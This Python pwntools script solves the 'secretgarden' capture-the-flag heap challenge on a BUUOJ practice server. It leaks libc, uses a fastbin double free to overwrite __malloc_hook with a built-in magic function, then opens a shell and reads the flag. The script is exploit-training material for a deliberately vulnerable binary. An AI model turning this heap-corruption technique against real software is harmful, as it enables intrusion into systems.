# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './secretgarden'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29251'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Your choice :',num)

def add(size , name = 'a' ):
    cmd(1)
    sla('Length of the name :' , size)
    sla('The name of flower :' , name)
    sla('The color of the flower :' , 'b'*0x17)

def show():
    cmd(2)

def delete(idx):
    cmd(3)
    sla('garden:' , idx)

def clear(idx):
    cmd(3)
    sla('garden:' , idx)

# one_gad = one_gadget(libc.path)
# 这 b 题为什么让我想了这么久，最开始的 double free 我都没有发现
# 之后还用了很傻比的错误方法，老寄吧想着你那got表干嘛
# 给你个 magic 函数是相当于给你了个 onegadget

def attack():
    magic = 0x400C5E
    
    add(0x80)
    add(0x60)
    delete(0)

    add(0x58 , '' )
    show()
    leak = l64() & 0xfffffffffff0
    lg('leak' , leak)

    __malloc_hook = leak + 0x10
    add(0x60)
    add(0x60)
    delete(3)
    delete(4)
    delete(3)
    
    add(0x60 , p64(__malloc_hook - 0x23))
    add(0x60)
    add(0x60)
    add(0x60 , 'a'*0x13 + p64(magic))
    cmd(1)

    # dbg()

    ''

attack()
p.success(getShell())
p.interactive()

'''
@File    :   secretgarden.py
@Time    :   2021/10/28 21:46:38
@Author  :   Niyah 
'''